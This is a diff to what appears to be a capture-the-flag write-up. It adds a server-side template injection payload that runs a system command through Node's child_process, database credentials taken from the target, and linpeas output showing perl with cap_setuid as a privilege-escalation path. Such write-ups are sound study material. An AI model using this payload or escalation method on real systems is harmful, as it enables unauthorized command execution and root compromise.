@@ -101,5 +101,22 @@ Connection: keep-alive
 Cookie: _csrf=Tq_qR2QxRfBNVi5JncWUOntN
 Sec-GPC: 1
 ```
-
-
+SSTI Injection Payload
+```
+{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('whoami')\")()}}
+```
+Found SQL Database
+```
+  host     : 'localhost',
+  user     : 'newsletter_admin',
+  password : 'StoreNLetters2021',
+  database : 'newsletters'
+```
+Runnng linpeas I find files with capabilites specifically perl with the capability to suid
+```
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
